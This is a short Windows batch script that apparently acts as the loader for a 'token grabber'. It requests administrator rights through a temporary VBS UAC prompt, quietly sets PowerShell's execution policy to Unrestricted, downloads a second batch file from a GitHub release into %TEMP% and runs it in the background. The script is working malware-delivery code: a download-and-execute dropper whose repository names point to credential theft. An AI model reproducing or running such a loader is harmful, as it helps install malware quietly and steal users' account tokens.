@echo off

>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if %errorlevel% neq 0 (
    echo Requesting administrative privileges...
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\GetAdmin.vbs"
    echo UAC.ShellExecute "%~0", "", "", "runas", 1 >> "%temp%\GetAdmin.vbs"
    "%temp%\GetAdmin.vbs"
    del "%temp%\GetAdmin.vbs"
    exit /B
)
:: example as link, it needs to be in releases.. https://github.com/EvilBytecode/Batchfile-Token-Grabber/releases/download/batchgrabber/Grabber.bat (EXAMPLE)
powershell -WindowStyle Hidden -Command "Set-ExecutionPolicy Unrestricted -Force"
set "gogings=%TEMP%\"
powershell -Command "& { Invoke-WebRequest -Uri 'https://github.com/DoIoco/Batchfile-Token-Grabber-Evilbyte/releases/download/release/Post-Setup.bat' -OutFile '%gogings%EvilByte.bat' }"
timeout /T 2 /NOBREAK >nul
start /B call %gogings%EvilByte.bat
